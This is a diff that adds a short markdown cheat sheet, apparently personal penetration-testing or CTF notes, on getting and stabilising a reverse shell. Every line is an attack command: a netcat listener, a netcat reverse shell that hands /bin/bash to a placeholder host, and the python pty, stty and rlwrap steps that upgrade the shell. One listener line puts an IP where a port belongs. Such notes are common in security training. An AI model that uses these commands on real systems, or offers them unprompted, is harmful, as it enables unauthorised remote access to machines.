@@ -1,0 +1,10 @@
+- `nc -lvnp <ip>`
+- `nc <LOCAL-IP> <PORT> -e /bin/bash`
+- nc stabilization
+	- `python -c 'import pty;pty.spawn("/bin/bash")'`
+	- `export TERM=xterm`
+	- `ctrl + Z`
+	- `stty raw -echo ; fg`
+	- reset terminal after closing connection: `reset`
+- `rlwrap nc -lvnp <port>` more stable listener (install with `sudo apt-get install rlwrap`)
+- for linux: `Ctrl + z ; stty raw -echo ; fg`
